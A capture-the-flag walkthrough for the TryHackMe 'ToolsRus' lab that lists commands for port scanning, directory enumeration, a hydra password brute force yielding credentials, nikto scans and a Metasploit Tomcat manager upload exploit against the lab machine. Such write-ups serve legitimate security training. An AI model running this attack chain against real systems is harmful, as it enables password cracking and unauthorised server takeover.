# ToolsRus

**Room Link:** [https://tryhackme.com/room/toolsrus](https://tryhackme.com/room/toolsrus)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>



### Scan all ports

No other ports found.

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hydra -l bob -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top1000.txt $VICTIM http-get /protected
```

<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nikto -id bob:bubbles -h http://$VICTIM:80/manager/html
```

<figure><img src="../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nikto -id bob:bubbles -h http://$VICTIM:1234/manager/html 
```

<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
msfconsole 
```

**Msfconsole**

```
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.10.98.194
set RPORT 1234
set HttpUsername bob
set HttpPassword bubbles
run
```

<figure><img src="../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

































